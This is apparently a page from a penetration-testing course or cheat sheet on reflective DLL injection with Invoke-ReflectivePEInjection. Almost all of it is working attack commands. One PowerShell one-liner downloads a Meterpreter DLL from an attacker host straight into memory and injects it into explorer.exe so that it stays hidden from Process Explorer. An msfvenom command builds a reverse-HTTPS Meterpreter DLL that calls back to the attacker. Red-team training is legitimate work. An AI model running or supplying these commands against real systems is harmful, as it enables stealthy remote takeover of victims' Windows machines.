# 04.03 Reflective DLL Injection

> Section 5.3 · Invoke-ReflectivePEInjection (no disk write, invisible to Process Explorer)

## Overview

Reflective DLL injection maps a DLL from a byte array into a remote process without calling LoadLibrary — so the DLL doesn't appear in the process's loaded modules list. Uses the PowerShell script by Joe Bialek and Matt Graeber. Pass the DLL as a byte array (download directly, never touch disk) and the target PID.

## Steps

- **Import script** — `Import-Module Invoke-ReflectivePEInjection.ps1`.
- **Download DLL into byte array** — `$bytes = (New-Object WebClient).DownloadData('http://<LHOST>/met.dll')`.
- **Get target PID** — `$pid = (Get-Process explorer).Id`.
- **Inject** — `Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $pid`.
- **Verify** — DLL NOT shown in Process Explorer module list (unlike LoadLibrary).

## Commands

### Reflective DLL injection one-liner

```powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
$bytes = (New-Object System.Net.WebClient).DownloadData('http://<LHOST>/met.dll')
$pid   = (Get-Process explorer).Id
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $pid
```

### Generate DLL with msfvenom

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=443 \
  EXITFUNC=thread -f dll -o met.dll
```
